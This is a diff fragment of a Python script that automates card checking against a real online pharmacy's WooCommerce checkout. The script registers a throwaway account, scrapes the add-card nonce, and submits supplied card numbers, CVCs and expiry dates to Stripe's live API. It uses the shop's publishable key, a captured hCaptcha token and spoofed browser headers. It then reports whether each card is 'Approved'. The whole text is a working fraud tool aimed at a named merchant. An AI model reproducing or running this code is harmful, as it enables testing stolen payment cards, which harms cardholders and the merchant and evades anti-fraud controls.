+        'referer': 'https://aptekaleki24.co.uk/my-account-2',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+
+    data = {
+        'email': acc,
+        'privacy_policy': 'on',
+        'woocommerce-register-nonce': register,
+        '_wp_http_referer': '/my-account-2',
+        'register': 'Zarejestruj się',
+    }
+
+    response = r.post('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers, data=data)
+
+    headers = {
+        'authority': 'aptekaleki24.co.uk',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'referer': 'https://aptekaleki24.co.uk/my-account-2/payment-methods',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+
+    response = r.get('https://aptekaleki24.co.uk/my-account-2/add-payment-method', cookies=r.cookies, headers=headers)
+
+    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]
+    print(nonce)
+
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': user,
+    }
+
+    data = f'type=card&billing_details[name]=+&billing_details[email]=makk2882%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=07085d6f-c819-4cc2-bf19-bbd3c19e0b4ec756b1&muid=b0cef40a-e0b4-4f5f-8b68-ae5c25ed66fb0f87ec&sid=27d86006-21ea-4836-87aa-f33def9368bbb523ef&pasted_fields=number&payment_user_agent=stripe.js%2F8f1da5bf41%3B+stripe-js-v3%2F8f1da5bf41%3B+card-element&referrer=https%3A%2F%2Faptekaleki24.co.uk&time_on_page=50390&key=pk_live_51IQzDCBKZpsKrCkNMyqzdD1smhnXungJIcpefiOevrq8VOUZc4YE2ehVLdUr6NMTqMWzY5bA3d3o9petmZSoOyvU00u8Awtmy3&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoibENSc09Jbjd6MU1BZDRtaDZVcE1TbUVEMVAra2RzS0RSelhrZDVPWVlHdmMvTVg5N0haeUN1SnEraDdsazhER01GdGNMYmFyTkg2Z1NlSWpsNzQwcTVDTG80OXJvcHZWclFZTUpIRExJYVVWd0Q3cHdtVWZDTVQxQURHM2NLRi9pMU96WFo4Umd4Q1pmLzJPb2F2RHRvK2lUS0ZsL2RDdlV5dXFyL1owSXZManAzT0JRSXNhVGlvS3cwRENyc0xkeXR1TURjYzZyem1XUEEvdkhGMWRLUTMwb2k5MUhHRnFoR1pNWWVsNUpwWGpsNWFLZmltZjBuREZjNHJCUWJDOXlHMFlRTUFoc281MUpvQjBRS0lJK0JRVHRFWjhGUld1QlRhcFp4WkFlQ3prSUpYejVUeldBTEZyYlpiRnBienErRC9ML0IyUllIN25xdGFkVXpEK2pFTE5rU29HY0kvL29pbXBMYzA4MkdGK3FKanpjTFlqYmt1U0JrbnZNazdzM0RTWHhWZzl4OE04KzcvWmNqRC96WE VaQStVZ jdYQVpUcXV5TmZFeXVkZjRDRGUvdy9GakxQSnJnOWpMck04VE0xY2x4blJ1T0V5dWlQdTMxZUJabkk1TXRtcHNSRUVtYUZvVFl5WHVSZW1xNTBBdEphNUxLQjlCZGxneHRDMFozbExlU1Z0ZFNqNFFqZXI3cXVUOGhoWEd2T0dwdzhzYVB4bkV3bHBNbHU0ckNDR1NqN2tNVDRSS3BZUVZXeVZobnRtcGZ6VjhrL243S0lZeUhrZFFRZDhsVmxxNmtxSEt2THNaNzNIZVEzUUFEbnpRS1pRL3NYUm9xYUh3TWFJOW5wcDNOeXZ4VmNEMzhhNngzcjVLMnl5U3RxSVBFSWhhMjJkdDJVazlFemk4UmNTYXpiODhpY3NLdHdTbGlRa1ErbmpWSW9zMFJhdGlpUnV2anNlNU9BbStLMjRDeVo3Sys0M3BNaE1ib2hPWGIvYjlYOGFJcUtkM1Zxa1c0a0ZIVTJ6MFNQSTE5ZFVOWEZ3SFowa1Q3dlc0ckhjdVZ6NVFqMGFkbFg1RVdQYXhWRU1wQURvRVltdmVwbUZPRGd3azFXL2JTb2NSak5QTE5YbjNDL3Y3UXNzZFR1R0Rxb2pHNXlYeWZLL25USXNZeThMeW9Id1hEbFU1cXlKUkQ4ZXFOYmJjU1hkZmNnMk91UTlHYnhoYWk4b3pXcG5IY1dZRC9rdXlBb0ljRk94eDErT0VmMS9CajcxRUQwN1VldC9rRlFLZFd4a0xwZ1NPQ0U5Vkd5OGR3TnN5OGt3N2x4QjJEU1FtVXJLK1lFUjdpRWl2MnhIREpvMHdRdkpVYVpkYzBOcVpNRk9JNU5rUkdVSkF5UFJ2cnpRQXhqUmJ2MmZmT1ZvWExuWFFBL2FldUgzMEdHaGIraFd5em1RblNLOXRIeGtTWU5NNFRmNjg5NGJUNG1KSVVwdlZsTy9jRkpSUXA1UE5ZUWQyWCtkbHVxMmhzd0ZRY212SnhEZWxKQzhjNjV3djFRTi9rcXNxZWI0OGExWU9FSjNZU2Q5T3ZudmlMczRqRk9HTjFJMFFNUXBhRUFtU3AvRldxRGxuS1dhbUg3VnM1ZFN5S2Z0cWZXa2xGczhwSWRBMGJCL1FHVnpKbzFQMWVlYW1Ia2FPeERSMDlKd09sL1kvSG81T3lyQ2ZwZUJoWWFpa0s2MVFoR1lROWJWL3d3bUJjcnRvc3NxUlZrU25nRk80bnpveC9QZjNWUU5ZbG5EOENpaEFxOW5GQXBwNTZzcm5odzVZcVZNU1lPYUFhWnB4M1UwVWNGUS9ibHBpei9rUTZaY25TRTIxN3ZaYzRtVUszYVV6aWd6WHY5ZkZmYUVpTGF6MHN3RWdJSEU2a25WbmtLMHFUQ1FSWTArUlU3VGh1'
+
+    response = requests .post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+    if not 'id' in response.json():
+        print('ERORR CARD')
+    else:
+        id = response.json()['id']
+        print(id)
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://aptekaleki24.co.uk',
+        'referer': 'https://aptekaleki24.co.uk/my-account-2/add-payment-method',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': user,
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    params = {
+        'wc-ajax': 'wc_stripe_create_setup_intent',
+    }
+
+    data = {
+        'stripe_source_id': id,
+        'nonce': nonce,
+    }
+    try:
+        response = r.post('https://aptekaleki24.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
+        i = (response.json())
+        return i
+    except:
+        print(response.json())
+        return 'Approved'
